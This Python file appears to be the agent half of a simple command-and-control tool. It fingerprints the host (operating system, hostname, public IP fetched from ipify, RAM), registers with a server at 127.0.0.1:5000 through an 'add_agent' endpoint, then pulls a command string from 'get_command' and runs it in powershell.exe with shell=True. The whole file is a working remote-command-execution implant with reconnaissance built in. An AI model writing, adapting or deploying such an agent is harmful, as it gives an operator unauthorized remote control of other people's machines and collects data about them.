import subprocess
import requests
import psutil
import platform

base_url = 'http://127.0.0.1:5000'


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def register():
    uname = platform.uname()
    # get os
    os = f"{uname.system} {uname.release}"
    # get host_name
    host_name = uname.node
    # get ip
    ip = requests.get('https://api.ipify.org').text
    # get system memory
    ram = get_size(psutil.virtual_memory().total)
    # set info in the requests json
    json = {
        'os': os,
        'host_name': host_name,
        'ip': ip,
        'ram': ram
    }
    response = requests.post(f"{base_url}/api/1.1/add_agent", json=json)
    print(response)
    return response.text


def get_command(agent_id):
    json = {
        'id': agent_id
    }
    data = requests.post('http://127.0.0.1:5000/api/1.1/get_command', json=json).text
    cmd = subprocess.Popen(["powershell.exe", data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes, "utf-8")  # plain old basic string
    print(output_str)


if __name__ == "__main__":
    id_agent = int(register())
    print(id_agent)
    get_command(id_agent)
